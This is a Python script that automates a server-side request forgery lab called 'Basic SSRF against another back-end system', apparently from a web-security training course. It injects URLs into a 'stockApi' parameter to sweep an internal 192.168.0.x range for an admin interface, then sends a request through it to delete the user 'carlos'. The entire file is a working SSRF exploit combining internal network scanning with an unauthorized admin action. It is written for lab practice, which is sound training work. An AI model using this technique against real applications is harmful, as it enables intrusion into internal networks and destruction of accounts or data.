import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Basic SSRF against another back-end system"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into 'stockApi' parameter to scan the internal network\n2. Delete carlos from the admin interface\n""")

    print(Fore.WHITE + "Injection point: " + Fore.YELLOW + "stockApi")

    for x in range(0, 255):
        payload = f"http://192.168.0.{x}:8080/admin"

        print(Fore.WHITE + "[1] Injecting payload to scan the internal netwrok (" +
              Fore.YELLOW + f"192.168.0.{x}:8080/admin" + Fore.WHITE + ")")

        data = {"stockApi": payload}

        check_stock = requests.post(
            f"{url}/product/stock", data=data, verify=False, proxies=proxies)

        if check_stock.status_code == 200:
            print(Fore.WHITE + "[2] Injecting payload to scan the internal netwrok (" +
                  Fore.YELLOW + f"192.168.0.{x}:8080/admin" + Fore.WHITE + ")")
            print(Fore.WHITE + "[3] Deleting carlos from the admin interface")

            data = {"stockApi": f"{payload}/delete?username=carlos"}
            try:
                r = requests.post(
                    f"{url}/product/stock", data=data, verify=False, proxies=proxies)

                return True
            except:
                return True
